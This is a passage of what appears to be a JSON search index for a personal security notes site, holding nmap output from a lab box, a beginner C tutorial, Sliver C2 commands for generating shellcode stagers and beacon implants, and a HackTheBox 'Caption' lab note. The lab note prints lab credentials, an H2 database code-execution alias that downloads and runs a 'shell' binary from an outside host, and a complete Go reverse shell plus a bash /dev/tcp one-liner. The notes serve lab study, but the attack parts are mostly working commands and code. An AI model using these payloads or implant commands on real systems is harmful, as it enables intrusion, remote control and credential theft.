class=\"nv\"\u003elang\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;en-US\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;theme-auto\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;meta \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;viewport\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtent\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;width=device-width, initial-scale=1\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;title\u0026gt;Gitea: Git with a cup of tea\u0026lt;/title\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;link \u003cspan class=\"nv\"\u003erel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;manifest\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|   HTTPOptions:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     HTTP/1.0 405 Method Not Allowed\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Allow: HEAD\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Allow: GET\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Set-Cookie: i_like_gitea=a275bfd19692210f; Path=/; HttpOnly; SameSite=Lax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Set-Cookie: _csrf=7aCFYOoWpGjTrCHOLcNbUFcmXws6MTcyMTI0MjAxMzU0Mjg2OTg2Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     X-Frame-Options: SAMEORIGIN\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|     Date: Wed, 17 Jul 2024 18:46:53 GMT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e|_    Content-Length: 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e3306/tcp filtered mysql\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e8081/tcp filtered blackice-icecap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eEnumerating shared folder:\u003c/p\u003e","tags":[],"title":"Build"},{"content":"Basic Structure of a C Program 1. Including Standard Libraries Standard libraries in C provide a set of predefined functions for performing common operations, such as input/output, memory management, etc. To include a standard library, you use the #include directive. For example, to include the standard input/output library stdio.h:\n#include \u0026lt;stdio.h\u0026gt;\r2. The main() Function and Its Arguments The main() function is the starting point for any C program. It typically has the following signature:\nint main(int argc, char *argv[]){ }\rint: This is the data type returned by the main() function, typically used to indicate the program\u0026rsquo;s exit status (0 for success, something else for an error). int argc: This represents the number of command-line arguments passed to the program. char *argv[]: This is an array of strings (an array of pointers) containing the arguments passed to the program. Variables and Data Types 1. Basic Data Types The C language offers various basic data types, including:\nint: for integers. float: for single-precision floating-point numbers. double: for double-precision floating-point numbers. char: for characters. void: for the absence of a type. 2. Variable Declaration To declare a variable, you specify the data type followed by the variable name. For example, to declare an integer variable named age:\nint age;\r3. Operators C supports various operators, including arithmetic operators (+, -, *, /, %), comparison operators (==, !=, \u0026lt;, \u0026gt;, \u0026lt;=, \u0026gt;=), and logical operators (\u0026amp;\u0026amp;, ||, !).\nFlow Control 1. Conditional Structures Conditional structures allow you to make decisions in your program. The most common ones are:\nif: Executes a block of code if a condition is true. else if: Used to evaluate multiple conditions. else: Executed if none of the previous conditions are true. Example of using if:\nif (condition) {// Code to execute if the condition is true } else if (other_condition) { } else { // Code to execute if the other condition is true // Code to execute if none of the conditions are true }` 2. Loops Loops allow you to execute a block of code repeatedly. Common loops include:\nfor: Used to perform an action a fixed number of times. while: Executes a block of code as long as a condition is true. do-while: Executes a block of code at least once and then repeats as long as a condition is true. Example of using a for loop:\nfor (initialization; condition; update) { //code to repeat }\r3. Jump Statements Jump statements allow you to control the flow of program execution. Common ones include break, continue, and goto. break exits a loop, continue moves to the next iteration, and goto jumps to a specified label in the code.\nFunctions 1. Function Definition and Invocation In C, you can define your own functions. To do so, you need to specify the return data type, function name, and parameters.\nExample of declaring and defining a function:\nint add(int a, int b) { return a + b; }\rTo call this function:\nint result = add(5, 3);\n2. Parameter Passing Parameters can be passed to a function by value (a copy of the value is passed) or by reference (a pointer is passed to the function).\nExample of passing by value:\nvoid doubleValue(int x) { x = x * 2; }\rExample of passing by reference:\nvoid doubleValue(int *x) { *x = *x * 2; }\r3. Recursive Functions A recursive function is a function that calls itself. It is used to solve recursive problems. Ensure there is a stopping condition to prevent infinite recursion.\nExample of a recursive function to calculate factorial:\nint factorial(int n) { if (n \u0026lt;= 1) { return 1; }else { return n * factorial(n - 1); } }\rArrays Array Declaration An array is a data structure that allows you to store a collection of values of the same type. To declare an array in C, you specify the data type followed by the array\u0026rsquo;s name and its size in square brackets.\nint array[5];\r// Declaration of an array of integers with a size of 5`\nAccessing Array Elements Array elements are accessed by their index (position) in the array. Indexing typically starts at zero. For example, to access the third element of the array:\nint third_element = array[2];\rMultidimensional Arrays Multidimensional arrays are arrays of arrays and are often used to represent tabular data, such as matrices.\nint matrix[3][3]; // Declaration of a 3x3 matrix Structures and Unions Structure Definition Structures allow you to create custom data types that group together multiple fields of different types.\nstruct Person { char name[50]; int age; }\rAccessing Structure Members To access the members of a structure, use the dot operator .\nstruct Person person1; person1.age = 25;\rUsing Unions Unions are similar to structures but share the same memory location for all their members. Only one member of a union can be used at a time.\nunion Data { int integer; double real; }\rStrings String Manipulation In C, strings are arrays of characters terminated by a null character (\\0). You can manipulate them using various functions and operations.\nchar string[] = \u0026#34;Hello\u0026#34;;\rLibrary Functions for Strings The C language offers many library functions to work with strings, such as strcpy, strcat, strlen, etc. These functions are defined in the string.h library.\nFile Handling Opening, Reading, Writing, and Closing Files To work with files in C, you must open a file, read or write data, and then close the file to release resources.\nFILE *file; file = fopen(\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;); // Read or write data here fclose(file);` Manipulating File Streams Functions like fopen, fclose, fprintf, fscanf, etc., are used to manipulate file streams. The open modes (e.g., \u0026ldquo;r\u0026rdquo; for reading, \u0026ldquo;w\u0026rdquo; for writing) define the file\u0026rsquo;s behavior.\nPreprocessor Preprocessor Directives The C preprocessor performs transformations before compilation. It is controlled by directives such as #define (for macros), #include (for including header files), and #ifdef (for conditional sections).\nData Structures Linked Lists, Stacks, Queues, Trees, etc. Data structures such as linked lists, stacks, queues, trees, etc., are commonly used in programming. You need to define and implement their associated operations.\nError Handling Handling Exceptions and Errors Error handling in C often relies on checking function return codes and using the errno library to obtain error information.\nOptimization and Performance Code Optimization Techniques Code optimization aims to improve the performance and efficiency of a C program. This includes using efficient loops, minimizing memory consumption, and more.\nCode Profiling Code profiling involves analyzing a program\u0026rsquo;s behavior to identify bottlenecks and areas of code that require optimization.\nBest Programming Practices Comments and Documentation Adding clear comments and documentation to your code is essential for making it understandable and maintainable.\nCoding Standards Following coding conventions, such as naming conventions, enhances code collaboration and readability.\nUsing Third-Party Libraries Using Third-Party Libraries for Specific Tasks In C, you can use third-party libraries to extend your program\u0026rsquo;s functionality, whether for data manipulation, creating graphical interfaces, network communication, and more.\nPointers in the C Language Pointers are one of the most powerful features in the C language. They allow direct access to memory, manipulation of variable addresses, and the creation of complex data structures. Understanding pointers is crucial for becoming a proficient C programmer.\nWhat Is a Pointer? A pointer is a variable that stores the memory address of another variable. In other words, it \u0026ldquo;points\u0026rdquo; to a memory location where a value is stored. This value can be of any data type, such as an integer, character, or even another pointer.\nPointers are powerful because they enable direct manipulation of memory, but they also require great care to avoid errors that can lead to program crashes or memory leaks.\nPointer Declaration To declare a pointer in C, use the * operator. For example, to declare a pointer to an integer (int), use the following syntax:\nint *ptr;\rThis creates a variable ptr that can store the memory address of a variable of type int.C\nAssigning Values to a Pointer A pointer must be initialized with the address of an existing variable. You can use the \u0026amp; operator to obtain the memory address of a variable. For example:\nint x = 10; int *ptr = \u0026amp;x; // ptr points to variable x Here, ptr is initialized with the memory address of x.\nAccessing the Pointed Value To access the value pointed to by a pointer, use the * operator. For example:\nint y = *ptr; // y takes the value of x (10) In this example, *ptr retrieves the value stored at the memory address pointed to by ptr, which is the value of x.\nNull Pointers A pointer can also be defined as null by assigning it the special value NULL. A null pointer does not point to any memory address and is commonly used to indicate the absence of a value.\nint *ptr = NULL; // Null pointer Pointers to Arrays Pointers are often used to manipulate arrays in C. An array is essentially a pointer to its first element. For example:\nint arr[5] = {1, 2, 3, 4, 5}; int *ptr = arr; // ptr points to the first element of the array In this example, ptr points to the first value in arr, which means that *ptr is equivalent to arr[0].\nPointer Operations You can perform arithmetic operations on pointers, such as incrementing and decrementing. This allows you to traverse an array or access adjacent memory locations.\nint *ptr = arr; // ptr points to the first value ptr++; // Now points to the second value Here, ptr++ makes ptr point to the second value in arr.\nPointers and Functions Pointers are often used to pass memory addresses to functions, allowing direct modification of variables in the caller\u0026rsquo;s memory. For example:\nvoid increment(int *x) { (*x)++; // Increment the value pointed to by x } int main() { int value = 5; increment(\u0026amp;value); // Pass the address of value to the function // After incrementing, value is now 6 }\r``\nIn this example, the increment function takes a pointer to an integer x as a parameter, allowing it to directly modify the value pointed to by x.\nDynamic Memory Allocation Dynamic memory allocation is a fundamental concept in C. It allows you to create data structures of variable size during program execution. This is particularly useful when the size of the data structure is not known in advance or when efficient memory management is required.\nThe malloc Function To dynamically allocate memory, you use the malloc (memory allocation) function. This function allocates a block of memory of the specified size and returns a pointer to the beginning of this block. Here\u0026rsquo;s how you can use it:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int *dynamicArray; int size = 5; // Dynamically allocate memory for an array of integers dynamicArray = (int *)malloc(size * sizeof(int)); if (dynamicArray == NULL) { printf(\u0026#34;Memory allocation error\\n\u0026#34;); return 1; // Exit the program with an error code } // You can now use dynamicArray as an array dynamicArray[0] = 10; dynamicArray[1] = 20; // Don\u0026#39;t forget to free dynamically allocated memory when done free(dynamicArray); return 0; }\rIn this example, malloc is used to dynamically allocate memory for an array of 5 integers. If the memory allocation is successful, malloc returns a pointer to the allocated memory, otherwise, it returns NULL. A check is performed to ensure that the allocation succeeded.\nUsing Pointers with malloc Once memory is allocated with malloc, you obtain a pointer to the start of the allocated block. You can use this pointer to access and manipulate the allocated memory. For example, you can store values in the dynamic array and retrieve them using this pointer.\ndynamicArray[0] = 10; dynamicArray[1] = 20;`\rThis stores the values 10 and 20 in the allocated memory.\nMemory Deallocation After you finish using dynamically allocated memory, it\u0026rsquo;s crucial to release it using the free function. This prevents memory leaks and is essential for maintaining program performance.\nfree(dynamicArray);\r","date":"2023-09-07","id":26,"permalink":"/notes/code/c/","summary":"\u003ch3 id=\"basic-structure-of-a-c-program\"\u003eBasic Structure of a C Program\u003c/h3\u003e\n\u003ch4 id=\"1-including-standard-libraries\"\u003e1. Including Standard Libraries\u003c/h4\u003e\n\u003cp\u003eStandard libraries in C provide a set of predefined functions for performing common operations, such as input/output, memory management, etc. To include a standard library, you use the \u003ccode\u003e#include\u003c/code\u003e directive. For example, to include the standard input/output library \u003ccode\u003estdio.h\u003c/code\u003e:\u003c/p\u003e","tags":[],"title":"C"},{"content":"","date":"2023-09-07","id":27,"permalink":"/notes/code/c-/","summary":"","tags":[],"title":"C++"},{"content":" Generate a shell code (session) : profiles new --mtls 10.8.3.12 --format shellcode win-shellcode stage-listener --url http://10.8.3.12:9001 --profile win-shellcode generate stager --lhost 10.8.3.12 -lport 9001 --protocole http --save /tmp\rhttps://github.com/JohnHammond/binnim\nStart listener : mlts use sessionId\rGenerate Session Implant for Labs : generate --mtls 10.8.3.12:443 --save /workspace mtls --lport 443 #or generate --mtls 10.8.3.12 --os linux --arch amd64 --skip-symbols --save /workspace --name heron mtls\rGenerate Beacon Implant for Labs : generate beacon --mtls 10.8.3.12:4431 --save /workspace/beacon.exe --seconds 5 --jitter 3\rRegenerate an Implant : regenerate --save /Users/moloch/Desktop NEW_GRAPE\rPort Forwarding portfwd add --remote 10.10.10.10:22\rStealth payloads generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --http \u0026lt;attacker ip\u0026gt;?proxy=http://\u0026lt;proxy ip\u0026gt;:8080,\u0026lt;attacker ip\u0026gt;?driver=wininet --name wutai-http --save /tmp/http.bin -G --skip-symbols\rProxychains : socks5 start\r","date":"2023-09-07","id":28,"permalink":"/notes/ad/c2/","summary":"\u003cul\u003e\n\u003cli\u003eGenerate a shell code (session) :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprofiles new --mtls 10.8.3.12 --format shellcode win-shellcode\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estage-listener --url http://10.8.3.12:9001 --profile win-shellcode\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egenerate stager --lhost 10.8.3.12 -lport \u003cspan class=\"m\"\u003e9001\u003c/span\u003e --protocole http --save /tmp\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003ehttps://github.com/JohnHammond/binnim\u003c/p\u003e","tags":[],"title":"C2"},{"content":" Scan : PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http Werkzeug/3.0.1 Python/3.10.12 8080/tcp open http-proxy\rFuzz: 200 GET 166l 320w 7429c http://caption.htb:8080/root/\rTry to connect : root : root\rNew user : margo : vFr\u0026amp;cS2#0!\rRCE H2 database console : CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; CALL EXECVE(\u0026#39;wget http://10.10.14.13:8000/shell\u0026#39;) CALL EXECVE(\u0026#39;chmod +x shell\u0026#39;) CALL EXECVE(\u0026#39;./shell\u0026#39;)\rNew creds : \u0026#39;admin\u0026#39; : \u0026#39;cFgjE@0%l0\u0026#39;:\rBuild reverse : //go:generate sh -c \u0026#34;CGO_ENABLED=0 go build -installsuffix netgo -tags netgo -ldflags \\\u0026#34;-s -w -extldflags \u0026#39;-static\u0026#39;\\\u0026#34; -o $DOLLAR(basename ${GOFILE} .go)`go env GOEXE` ${GOFILE}\u0026#34; // +build !windows // Reverse Shell in Go // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet // Test with nc -lvvp 6666 package main import ( \u0026#34;net\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;time\u0026#34; ) func main() { reverse(\u0026#34;10.10.14.43:6666\u0026#34;) } // bash -i \u0026gt;\u0026amp; /dev/tcp/localhost/6666 0\u0026gt;\u0026amp;1 func reverse(host string) { c, err := net.Dial(\u0026#34;tcp\u0026#34;, host) if nil != err { if nil != c { c.Close() } time.Sleep(time.Minute) reverse(host) } cmd := exec.Command(\u0026#34;/bin/sh\u0026#34;) cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c cmd.Run() c.Close() reverse(host) }\r","date":"2023-09-07","id":29,"permalink":"/notes/lab/htb/caption/","summary":"\u003cul\u003e\n\u003cli\u003eScan :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http       Werkzeug/3.0.1 Python/3.10.12\n8080/tcp open  http-proxy\u003c/code\u003e\u003c/pre\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eFuzz:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e200\u003c/span\u003e      GET      166l      320w     7429c http://caption.htb:8080/root/\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eTry to connect :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot : root\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eNew user :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emargo : vFr\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003ecS2#0!\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eRCE H2 database console :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCREATE ALIAS EXECVE AS \u003cspan class=\"nv\"\u003e$$\u003c/span\u003e String execve\u003cspan class=\"o\"\u003e(\u003c/span\u003eString cmd\u003cspan class=\"o\"\u003e)\u003c/span\u003e throws java.io.IOException \u003cspan class=\"o\"\u003e{\u003c/span\u003e java.util.Scanner \u003cspan class=\"nv\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new java.util.Scanner\u003cspan class=\"o\"\u003e(\u003c/span\u003eRuntime.getRuntime\u003cspan class=\"o\"\u003e()\u003c/span\u003e.exec\u003cspan class=\"o\"\u003e(\u003c/span\u003ecmd\u003cspan class=\"o\"\u003e)\u003c/span\u003e.getInputStream\u003cspan class=\"o\"\u003e())\u003c/span\u003e.useDelimiter\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\\\\\\\\A\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e s.hasNext\u003cspan class=\"o\"\u003e()\u003c/span\u003e ? s.next\u003cspan class=\"o\"\u003e()\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"nv\"\u003e$$\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCALL EXECVE\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;wget http://10.10.14.13:8000/shell\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCALL EXECVE\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;chmod +x shell\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCALL EXECVE\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;./shell\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eNew creds :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\u0026#39;admin\u0026#39;\u003c/span\u003e : \u003cspan class=\"s1\"\u003e\u0026#39;cFgjE@0%l0\u0026#39;\u003c/span\u003e:\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eBuild reverse :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e//go:generate sh -c \u003cspan class=\"s2\"\u003e\u0026#34;CGO_ENABLED=0 go build -installsuffix netgo -tags netgo -ldflags \\\u0026#34;-s -w -extldflags \u0026#39;-static\u0026#39;\\\u0026#34; -o \u003c/span\u003e\u003cspan class=\"nv\"\u003e$DOLLAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e(basename \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eGOFILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e .go)`go env GOEXE` \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eGOFILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// +build !windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Reverse Shell in Go\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Test with nc -lvvp \u003cspan class=\"m\"\u003e6666\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epackage main\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 